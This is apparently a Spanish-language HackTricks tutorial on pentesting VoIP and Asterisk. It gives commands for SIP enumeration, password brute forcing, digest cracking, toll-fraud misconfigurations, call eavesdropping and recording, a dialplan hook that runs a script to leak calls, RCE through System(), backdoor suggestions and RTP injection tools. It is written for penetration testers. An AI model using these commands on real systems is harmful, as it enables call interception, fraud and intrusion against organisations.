# Pentesting VoIP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci√≥n b√°sica sobre VoIP

Para comenzar a aprender c√≥mo funciona VoIP, consulta:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Enumeraci√≥n de VoIP

### N√∫meros de tel√©fono

Uno de los primeros pasos que un equipo de Red puede hacer es buscar n√∫meros de tel√©fono disponibles para contactar con la empresa utilizando herramientas de OSINT, b√∫squedas en Google o raspando las p√°ginas web.

Una vez que tengas los n√∫meros de tel√©fono, puedes utilizar servicios en l√≠nea para identificar el operador:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Saber si el operador proporciona servicios de VoIP te permitir√° identificar si la empresa est√° utilizando VoIP... Adem√°s, es posible que la empresa no haya contratado servicios de VoIP, pero est√© utilizando tarjetas PSTN para conectar su propia PBX de VoIP a la red telef√≥nica tradicional.

Cosas como respuestas autom√°ticas de m√∫sica generalmente indican que se est√° utilizando VoIP.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Informaci√≥n de OSINT

Cualquier otra enumeraci√≥n de OSINT que ayude a identificar el software de VoIP utilizado ser√° √∫til para un Equipo Rojo.

### Enumeraci√≥n de la red

* **`nmap`** es capaz de escanear servicios UDP, pero debido a la cantidad de servicios UDP que se est√°n escaneando, es muy lento y puede no ser muy preciso con este tipo de servicios.
* **`svmap`** de SIPVicious (`sudo apt install sipvicious`): ubicar√° los servicios SIP en la red indicada.
* `svmap` es **f√°cil de bloquear** porque utiliza el User-Agent `friendly-scanner`, pero puedes modificar el c√≥digo de `/usr/share/sipvicious/sipvicious` y cambiarlo.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`sipscan.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Sipscan es un esc√°ner muy r√°pido para servicios SIP sobre UDP, TCP o TLS. Utiliza multihilo y puede escanear grandes rangos de redes. Permite indicar f√°cilmente un rango de puertos, escanear tanto TCP como UDP, utilizar otro m√©todo (por defecto utilizar√° OPTIONS) y especificar un User-Agent diferente (y m√°s).
```bash
./sipscan.py -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200

```
* **metasploit**:

Metasploit es una herramienta de prueba de penetraci√≥n ampliamente utilizada en el campo de la seguridad inform√°tica. Proporciona una plataforma para realizar pruebas de seguridad en sistemas y redes, identificando vulnerabilidades y explot√°ndolas de manera controlada. Metasploit ofrece una amplia gama de m√≥dulos y exploits que permiten a los profesionales de la seguridad evaluar la seguridad de los sistemas y aplicaciones. Es una herramienta poderosa y vers√°til que se utiliza tanto en pruebas de penetraci√≥n √©ticas como en actividades maliciosas.
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Enumeraci√≥n adicional de la red

El PBX tambi√©n podr√≠a estar exponiendo otros servicios de red, como:

* **69/UDP (TFTP)**: Actualizaciones de firmware
* **80 (HTTP) / 443 (HTTPS)**: Para administrar el dispositivo desde la web
* **389 (LDAP)**: Alternativa para almacenar la informaci√≥n de los usuarios
* **3306 (MySQL)**: Base de datos MySQL
* **5038 (Manager)**: Permite utilizar Asterisk desde otras plataformas
* **5222 (XMPP)**: Mensajes utilizando Jabber
* **5432 (PostgreSQL)**: Base de datos PostgreSQL
* Y otros...

### Enumeraci√≥n de m√©todos

Es posible encontrar **qu√© m√©todos est√°n disponibles** para usar en el PBX utilizando `sipenumerate.py` de [**sippts**](https://github.com/Pepelux/sippts)
```bash
python3 sipenumerate.py -i 10.10.0.10 -r 5080
```
### Enumeraci√≥n de extensiones

Las extensiones en un sistema de PBX (Private Branch Exchange) se refieren a los **identificadores internos √∫nicos asignados a l√≠neas telef√≥nicas individuales**, dispositivos o usuarios dentro de una organizaci√≥n o empresa. Las extensiones permiten **enrutamiento eficiente de llamadas dentro de la organizaci√≥n**, sin la necesidad de n√∫meros de tel√©fono externos individuales para cada usuario o dispositivo.

* **`svwar`** de SIPVicious (`sudo apt install sipvicious`): `svwar` es un esc√°ner de l√≠neas de extensi√≥n de PBX SIP gratuito. En concepto, funciona de manera similar a los wardialers tradicionales al **adivinar un rango de extensiones o una lista dada de extensiones**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`sipextend.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Sipexten identifica extensiones en un servidor SIP. Sipexten puede verificar grandes rangos de red y puertos.
```bash
python3 sipexten.py -i 10.10.0.10 -r 5080 -e 100-200
```
* **metasploit**: Tambi√©n puedes enumerar extensiones/nombres de usuario con metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** es un enumerador de fuerza bruta de nombres de usuario del protocolo Inter Asterisk Exchange. enumIAX puede operar en dos modos distintos; Adivinanza secuencial de nombres de usuario o Ataque de diccionario.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Ataques a VoIP

### Fuerza Bruta de Contrase√±as

Una vez descubierto el **PBX** y algunos **extensiones/nombres de usuario**, un Equipo Rojo podr√≠a intentar **autenticarse a trav√©s del m√©todo `REGISTER`** en una extensi√≥n utilizando un diccionario de contrase√±as comunes para realizar un ataque de fuerza bruta.

{% hint style="danger" %}
Ten en cuenta que un **nombre de usuario** puede ser el mismo que la extensi√≥n, pero esta pr√°ctica puede variar dependiendo del sistema PBX, su configuraci√≥n y las preferencias de la organizaci√≥n...

Si el nombre de usuario no es el mismo que la extensi√≥n, deber√°s **averiguar el nombre de usuario para realizar el ataque de fuerza bruta**.
{% endhint %}

* **`svcrack`** de SIPVicious (`sudo apt install sipvicious`): SVCrack te permite descifrar la contrase√±a de un nombre de usuario/extensi√≥n espec√≠fico en un PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`sipcrack.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIP Digest Crack es una herramienta para crackear las autenticaciones de digest dentro del protocolo SIP.

{% code overflow="wrap" %}
```bash
python3 siprcrack.py -i 10.10.0.10 -r 5080 -e 100,101,103-105 -w wordlist/rockyou.txt
```
{% endcode %}

* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Sniffing de VoIP

Si encuentras equipos de VoIP dentro de una **red Wifi abierta**, podr√≠as **capturar toda la informaci√≥n**. Adem√°s, si est√°s dentro de una red m√°s cerrada (conectada a trav√©s de Ethernet o Wifi protegida), podr√≠as realizar ataques de **MitM como** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) entre el **PBX y la pasarela** para capturar la informaci√≥n.

Entre la informaci√≥n de la red, podr√≠as encontrar **credenciales web** para administrar el equipo, **extensiones de usuario**, **nombre de usuario**, **direcciones IP**, incluso **contrase√±as encriptadas** y **paquetes RTP** que podr√≠as reproducir para **escuchar la conversaci√≥n**, y m√°s.

Para obtener esta informaci√≥n, podr√≠as utilizar herramientas como Wireshark, tcpdump... pero una **herramienta especialmente creada para capturar conversaciones de VoIP es** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Ten en cuenta que si se utiliza **TLS en la comunicaci√≥n SIP**, no podr√°s ver la comunicaci√≥n SIP en claro.\
Lo mismo ocurrir√° si se utiliza **SRTP** y **ZRTP**, los **paquetes RTP no estar√°n en texto claro**.
{% endhint %}

#### Credenciales SIP

[Revisa este ejemplo para entender mejor una **comunicaci√≥n SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) para aprender c√≥mo se env√≠an las **credenciales**.

* **`sipdump`** y **`sipcrack`,** parte de **sipcrack** (`apt-get install sipcrack`): Estas herramientas pueden **extraer** de un **pcap** las **autenticaciones digest** dentro del protocolo SIP y **realizar ataques de fuerza bruta** sobre ellas.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`siptshar.py`, `sipdump.py`, `sipcrack.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:**
* **SipTshark** extrae datos del protocolo SIP de un archivo PCAP.
* **SipDump** extrae autenticaciones de SIP Digest de un archivo PCAP.
* **SIP Digest Crack** es una herramienta para crackear las autenticaciones de digest dentro del protocolo SIP.
```bash
python3 siptshark.py -f captura3.pcap [-filter auth]
python3 sipdump.py -f captura3.pcap -o data.txt
python3 sipcrack.py -f data.txt -w wordlist/rockyou.txt
```
#### C√≥digos DTMF

No solo se pueden encontrar las credenciales SIP en el tr√°fico de red, tambi√©n es posible encontrar c√≥digos DTMF que se utilizan, por ejemplo, para acceder al buz√≥n de voz.\
Es posible enviar estos c√≥digos en mensajes SIP INFO, en audio o dentro de paquetes RTP. Si los c√≥digos est√°n dentro de paquetes RTP, puedes cortar esa parte de la conversaci√≥n y usar la herramienta multimo para extraerlos:
```bash
multimon -a DTMF -t wac pin.wav
```
### Configuraciones incorrectas de llamadas gratuitas / conexiones de Asterisks

En Asterisk es posible permitir una conexi√≥n **desde una direcci√≥n IP espec√≠fica** o desde **cualquier direcci√≥n IP**:
```
host=10.10.10.10
host=dynamic
```
Si se especifica una direcci√≥n IP, el host **no necesitar√° enviar solicitudes REGISTER** de vez en cuando (en el paquete REGISTER se env√≠a el tiempo de vida, generalmente 30 minutos, lo que significa que en otro escenario el tel√©fono necesitar√° REGISTRARSE cada 30 minutos). Sin embargo, deber√° tener puertos abiertos que permitan conexiones desde el servidor VoIP para recibir llamadas.

Para definir usuarios, se pueden definir como:

* **`type=user`**: El usuario solo puede recibir llamadas como usuario.
* **`type=friend`**: Es posible realizar llamadas como par y recibirlas como usuario (se utiliza con extensiones).
* **`type=peer`**: Es posible enviar y recibir llamadas como par (trunk SIP).

Tambi√©n es posible establecer confianza con la variable insegura:

* **`insecure=port`**: Permite conexiones de pares validadas por IP.
* **`insecure=invite`**: No requiere autenticaci√≥n para mensajes INVITE.
* **`insecure=port,invite`**: Ambos.

{% hint style="warning" %}
Cuando se utiliza **`type=friend`**, el **valor** de la variable **host** **no se utilizar√°**, por lo que si un administrador **configura incorrectamente un trunk SIP** utilizando ese valor, **cualquiera podr√° conectarse a √©l**.

Por ejemplo, esta configuraci√≥n ser√≠a vulnerable:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Llamadas gratuitas / Configuraciones incorrectas de contexto en Asterisk

En Asterisk, un **contexto** es un contenedor o secci√≥n con nombre en el plan de marcado que **agrupa extensiones, acciones y reglas relacionadas**. El plan de marcado es el componente principal de un sistema Asterisk, ya que define **c√≥mo se manejan y enrutan las llamadas entrantes y salientes**. Los contextos se utilizan para organizar el plan de marcado, gestionar el control de acceso y proporcionar separaci√≥n entre las diferentes partes del sistema.

Cada contexto se define en el archivo de configuraci√≥n, t√≠picamente en el archivo **`extensions.conf`**. Los contextos se indican mediante corchetes, con el nombre del contexto encerrado en ellos. Por ejemplo:
```bash
csharpCopy code[my_context]
```
Dentro del contexto, se definen extensiones (patrones de n√∫meros marcados) y se les asocia una serie de acciones o aplicaciones. Estas acciones determinan c√≥mo se procesa la llamada. Por ejemplo:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Este ejemplo demuestra un contexto simple llamado "mi\_contexto" con una extensi√≥n "100". Cuando alguien marca 100, la llamada ser√° contestada, se reproducir√° un mensaje de bienvenida y luego la llamada ser√° terminada.

Este es **otro contexto** que permite **llamar a cualquier otro n√∫mero**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Si el administrador define el **contexto predeterminado** como:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Cualquier persona podr√° utilizar el **servidor para llamar a cualquier otro n√∫mero** (y el administrador del servidor pagar√° por la llamada).
{% endhint %}

{% hint style="danger" %}
Adem√°s, por defecto el archivo **`sip.conf`** contiene **`allowguest=true`**, entonces **cualquier** atacante sin autenticaci√≥n podr√° llamar a cualquier otro n√∫mero.
{% endhint %}

*   **`sipinvite.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Sipinvite verifica si un servidor PBX nos permite hacer llamadas sin autenticaci√≥n. Si el servidor SIP tiene una configuraci√≥n incorrecta, nos permitir√° hacer llamadas a n√∫meros externos. Tambi√©n puede permitirnos transferir la llamada a un segundo n√∫mero externo.

Por ejemplo, si tu servidor Asterisk tiene una mala configuraci√≥n de contexto, puedes aceptar solicitudes INVITE sin autorizaci√≥n. En este caso, un atacante puede hacer llamadas sin conocer ning√∫n usuario/contrase√±a.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
python3 sipinvite.py -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
python3 sipinvite.py -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Llamadas gratuitas / IVRS mal configurado

IVRS significa **Sistema de Respuesta de Voz Interactiva**, una tecnolog√≠a de telefon√≠a que permite a los usuarios interactuar con un sistema informatizado a trav√©s de comandos de voz o tonos t√°ctiles. IVRS se utiliza para construir sistemas de manejo de llamadas automatizados que ofrecen una variedad de funcionalidades, como proporcionar informaci√≥n, dirigir llamadas y capturar la entrada del usuario.

El IVRS en los sistemas VoIP generalmente consta de:

1. **Indicaciones de voz**: Mensajes de audio pregrabados que gu√≠an a los usuarios a trav√©s de las opciones del men√∫ y las instrucciones del IVR.
2. **Se√±alizaci√≥n DTMF** (Dual-Tone Multi-Frequency): Entradas de tonos t√°ctiles generadas al presionar teclas en el tel√©fono, que se utilizan para navegar por los men√∫s del IVR y proporcionar informaci√≥n.
3. **Enrutamiento de llamadas**: Dirigir las llamadas al destino adecuado, como departamentos espec√≠ficos, agentes o extensiones seg√∫n la entrada del usuario.
4. **Captura de entrada del usuario**: Recopilar informaci√≥n de los llamantes, como n√∫meros de cuenta, IDs de casos u otros datos relevantes.
5. **Integraci√≥n con sistemas externos**: Conectar el sistema IVR a bases de datos u otros sistemas de software para acceder o actualizar informaci√≥n, realizar acciones o activar eventos.

En un sistema VoIP Asterisk, puedes crear un IVR utilizando el plan de marcaci√≥n (archivo **`extensions.conf`**) y varias aplicaciones como `Background()`, `Playback()`, `Read()`, y m√°s. Estas aplicaciones te ayudan a reproducir indicaciones de voz, capturar la entrada del usuario y controlar el flujo de la llamada.

#### Ejemplo de configuraci√≥n vulnerable
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
El ejemplo anterior muestra c√≥mo se le pide al usuario que **presione 1 para llamar** a un departamento, **2 para llamar** a otro, o **la extensi√≥n completa** si la conoce.\
La vulnerabilidad radica en el hecho de que **no se verifica la longitud de la extensi√≥n indicada**, por lo que un usuario podr√≠a ingresar un n√∫mero completo durante el tiempo de espera de 5 segundos y se realizar√° la llamada.

### Inyecci√≥n de extensi√≥n

Usando una extensi√≥n como:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Donde **`${EXTEN}`** es la **extensi√≥n** que se llamar√°, cuando se introduzca la **ext 101**, esto es lo que suceder√≠a:
```scss
exten => 101,1,Dial(SIP/101)
```
Sin embargo, si **`${EXTEN}`** permite introducir **m√°s que n√∫meros** (como en versiones anteriores de Asterisk), un atacante podr√≠a introducir **`101&SIP123123123`** para llamar al n√∫mero de tel√©fono 123123123. Y este ser√≠a el resultado:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Por lo tanto, una llamada a la extensi√≥n **`101`** y **`123123123`** ser√° enviada y solo se establecer√° la primera que reciba la llamada... pero si un atacante utiliza una **extensi√≥n que evita cualquier coincidencia** que se est√© realizando pero que no existe, podr√≠a **inyectar una llamada solo al n√∫mero deseado**.

## SIPDigestLeak

El SIP Digest Leak es una vulnerabilidad que afecta a una gran cantidad de tel√©fonos SIP, incluyendo tanto tel√©fonos IP de hardware como de software, as√≠ como adaptadores telef√≥nicos (VoIP a anal√≥gico). La vulnerabilidad permite la **filtraci√≥n de la respuesta de autenticaci√≥n Digest**, que se calcula a partir de la contrase√±a. Un **ataque de contrase√±a sin conexi√≥n es entonces posible** y puede recuperar la mayor√≠a de las contrase√±as basadas en la respuesta del desaf√≠o.

Escenario de vulnerabilidad (para [**m√°s informaci√≥n consulta esto**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)):

1. Un tel√©fono IP (v√≠ctima) est√° escuchando en el puerto 5060, aceptando llamadas telef√≥nicas.
2. El atacante env√≠a un INVITE al tel√©fono IP.
3. El tel√©fono v√≠ctima comienza a sonar y alguien contesta y cuelga (porque nadie responde al tel√©fono en el otro extremo).
4. Cuando se cuelga el tel√©fono, el **tel√©fono v√≠ctima env√≠a un BYE al atacante**.
5. El atacante emite una respuesta 407 que **solicita autenticaci√≥n** y emite un desaf√≠o de autenticaci√≥n.
6. El **tel√©fono v√≠ctima proporciona una respuesta al desaf√≠o de autenticaci√≥n** en un segundo BYE.
7. El atacante puede entonces realizar un ataque de fuerza bruta en la respuesta del desaf√≠o en su m√°quina local (o en una red distribuida, etc.) y adivinar la contrase√±a.

* **sipdigestleak.py** de [**sippts**](https://github.com/Pepelux/sippts)**:** SipDigestLeak explota esta vulnerabilidad.
```bash
python3 sipdigestleak.py -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call permite a un **usuario web** (que por ejemplo puede estar interesado en un producto) **introducir** su **n√∫mero de tel√©fono** para recibir una llamada. Luego se llamar√° a un comercial y cuando este **conteste el tel√©fono**, el usuario ser√° **llamado y conectado con el agente**.

Un perfil com√∫n de Asterisk para esto es:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* El perfil anterior permite que **CUALQUIER direcci√≥n IP se conecte** (si se conoce la contrase√±a).
* Para **organizar una llamada**, como se especific√≥ anteriormente, **no es necesario tener permisos de lectura** y solo se necesita **origen** en **escritura**.

Con esos permisos, cualquier IP que conozca la contrase√±a podr√≠a conectarse y extraer demasiada informaci√≥n, como:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Se puede solicitar m√°s informaci√≥n o acciones.**

### **Espionaje**

En Asterisk es posible utilizar el comando **`ChanSpy`** indicando la **extensi√≥n(es) a monitorear** (o todas ellas) para escuchar las conversaciones que est√°n ocurriendo. Este comando debe ser asignado a una extensi√≥n.

Por ejemplo, **`exten => 333,1,ChanSpy('all',qb)`** indica que si **llamas** a la **extensi√≥n 333**, se **monitorear√°n** **`todas`** las extensiones, **comenzando a escuchar** cuando una nueva conversaci√≥n comienza (**`b`**) en modo silencioso (**`q`**) ya que no queremos interactuar en ella. Puedes pasar de una conversaci√≥n a otra presionando **`*`**, o marcando el n√∫mero de extensi√≥n.

Tambi√©n es posible utilizar **`ExtenSpy`** para monitorear solo una extensi√≥n.

En lugar de escuchar las conversaciones, es posible **grabarlas en archivos** utilizando una extensi√≥n como:

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Las llamadas se guardar√°n en **`/tmp`**.

Incluso podr√≠as hacer que Asterisk **ejecute un script que filtrar√° la llamada** cuando se cierre.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed

**RTCPBleed** es un importante problema de seguridad que afecta a los servidores VoIP basados en Asterisk (publicado en 2017). La vulnerabilidad permite que el tr√°fico de **RTP (Protocolo de Tiempo Real)**, que lleva las conversaciones VoIP, sea **interceptado y redirigido por cualquier persona en Internet**. Esto ocurre porque el tr√°fico de RTP evita la autenticaci√≥n al atravesar los firewalls de NAT (Traducci√≥n de Direcciones de Red).

Los proxies de RTP intentan solucionar las **limitaciones de NAT** que afectan a los sistemas RTC al actuar como intermediarios en los flujos de RTP entre dos o m√°s partes. Cuando hay NAT, el software del proxy de RTP a menudo no puede confiar en la informaci√≥n de IP y puerto de RTP obtenida a trav√©s de la se√±alizaci√≥n (por ejemplo, SIP). Por lo tanto, varios proxies de RTP han implementado un mecanismo donde esta **tupla de IP y puerto se aprende autom√°ticamente**. Esto se hace a menudo inspeccionando el tr√°fico de RTP entrante y marcando la IP y puerto de origen de cualquier tr√°fico de RTP entrante como aquellos a los que se debe responder. Este mecanismo, que puede llamarse "modo de aprendizaje", **no utiliza ning√∫n tipo de autenticaci√≥n**. Por lo tanto, los **atacantes** pueden **enviar tr√°fico de RTP al proxy de RTP** y recibir el tr√°fico de RTP proxy destinado al llamante o al receptor de un flujo de RTP en curso. Llamamos a esta vulnerabilidad RTP Bleed porque permite a los atacantes recibir flujos de medios RTP destinados a usuarios leg√≠timos.

Otro comportamiento interesante de los proxies de RTP y las pilas de RTP es que a veces, **incluso si no son vulnerables a RTP Bleed**, aceptar√°n, reenviar√°n y/o procesar√°n paquetes de RTP de cualquier origen. Por lo tanto, los atacantes pueden enviar paquetes de RTP que les permitan inyectar sus propios medios en lugar de los leg√≠timos. Llamamos a este ataque RTP injection porque permite la inyecci√≥n de paquetes de RTP ileg√≠timos en flujos de RTP existentes. Esta vulnerabilidad puede encontrarse tanto en proxies de RTP como en puntos finales.

Asterisk y FreePBX tradicionalmente han utilizado la configuraci√≥n **`NAT=yes`**, que permite que el tr√°fico de RTP evite la autenticaci√≥n, lo que puede provocar que no haya audio o que el audio sea unidireccional en las llamadas.

Para obtener m√°s informaci√≥n, consulta [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`rtpbleed.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Detecta la vulnerabilidad de RTP Bleed enviando flujos de RTP.
```bash
python3 rtpbleed.py -i 10.10.0.10
```
* **`rtcpbleed.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Detecta la vulnerabilidad de RTP Bleed enviando flujos RTP.
```bash
python3 rtcpbleed.py -i 10.10.0.10
```
* **`rtpbleedflood.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Explota la vulnerabilidad de RTP Bleed enviando flujos de RTP
```bash
python3 rtpbleedflood.py -i 10.10.0.10 -p 10070 -v
```
* **`rtpbleedinject.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** Explota la vulnerabilidad de RTP Bleed enviando flujos de RTP (desde un archivo de audio)
```bash
python3 rtpbleedinject.py -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE (Ejecuci√≥n Remota de C√≥digo)

En Asterisk, de alguna manera logras ser capaz de **agregar reglas de extensi√≥n y recargarlas** (por ejemplo, comprometiendo un servidor de administraci√≥n web vulnerable), es posible obtener RCE utilizando el comando **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Existe un comando llamado **`Shell`** que se puede utilizar **en lugar de `System`** para ejecutar comandos del sistema si es necesario.

{% hint style="warning" %}
Si el servidor **proh√≠be el uso de ciertos caracteres** en el comando **`System`** (como en Elastix), verifica si el servidor web permite **crear archivos de alguna manera dentro del sistema** (como en Elastix o trixbox) y √∫salo para **crear un script de puerta trasera** y luego utiliza **`System`** para **ejecutar** ese **script**.
{% endhint %}

#### Archivos locales interesantes y permisos

* **`sip.conf`** -> Contiene la contrase√±a de los usuarios SIP.
* Si el servidor de Asterisk se est√° ejecutando como root, podr√≠as comprometer el root.
* El usuario root de **mysql** podr√≠a **no tener contrase√±a**.
* Esto se podr√≠a utilizar para crear un nuevo usuario de mysql como puerta trasera.
* **`FreePBX`**
* **`amportal.conf`** -> Contiene la contrase√±a del administrador del panel web (FreePBX).
* **`FreePBX.conf`** -> Contiene la contrase√±a del usuario FreePBXuser utilizado para acceder a la base de datos.
* Esto se podr√≠a utilizar para crear un nuevo usuario de mysql como puerta trasera.
* **`Elastix`**
* **`Elastix.conf`** -> Contiene varias contrase√±as en texto claro, como la contrase√±a de root de mysql, la contrase√±a de IMAPd y la contrase√±a del administrador web.
* **Varias carpetas** pertenecer√°n al usuario de Asterisk comprometido (si no se est√° ejecutando como root). Este usuario puede leer los archivos anteriores y tambi√©n controla la configuraci√≥n, por lo que podr√≠a hacer que Asterisk cargue otros binarios con puertas traseras cuando se ejecuten.

### Inyecci√≥n de RTP

Es posible insertar un archivo **`.wav`** en las conversaciones utilizando herramientas como **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) y **`rtpmixsound`** (`sudo apt install rtpmixsound`).

O puedes utilizar los scripts de [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) para **escanear conversaciones** (**`rtpscan.pl`**), enviar un archivo `.wav` a una conversaci√≥n (**`rtpsend.pl`**) e **insertar ruido** en una conversaci√≥n (**`rtpflood.pl`**).

### DoS

Existen varias formas de intentar lograr un ataque de denegaci√≥n de servicio (DoS) en servidores VoIP.

